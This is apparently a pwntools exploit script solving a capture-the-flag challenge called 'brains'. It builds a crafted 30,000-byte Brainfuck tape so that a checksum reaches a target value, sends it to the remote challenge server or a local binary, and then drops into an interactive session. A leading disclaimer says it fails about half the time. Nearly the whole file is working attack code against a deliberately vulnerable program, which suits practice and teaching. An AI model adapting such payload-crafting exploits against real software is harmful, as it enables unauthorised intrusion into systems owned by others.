### DISCLAIMER ###
# This script fails to get the flag about 50% of the time due to issues with
# the stdout buffer getting slammed with 30,000+ characters, so just run it
# a few times until you get the flag. Or if you run it locally you should get
# the flag more consistently.



from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break *0x4013e6
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("spaceheroes-brains.chals.io", 443, ssl=True, sni="spaceheroes-brains.chals.io")
    else:
        return process(e.path)

p = start()

# BrainFuck Stuff

goal = 0x732b5ec6
print(hex(goal))

# Set Tape
arr = []
for i in range(30000):
	arr.append(0xa6)

arr[0] = 0x33
arr[1] = 0x01
arr[2] = 0x00

num = arr[2] << 24
num += arr[1] << 16
num += arr[0] << 8

total = 0x100000000

for i in range(30000):
	total -= num + arr[i]

diff = total - goal

for i in range(diff):
	arr[i + 10] += 1

arr[2] = 0x01
convert = b''
for c in arr:
	convert += b'%c' %(c)
convert += b'\x00'

print(convert)
# Craft Payload
brain = b',>,>,->,[>,]'
fuck = convert

p.sendline(brain)
p.sendline(fuck)
p.interactive()

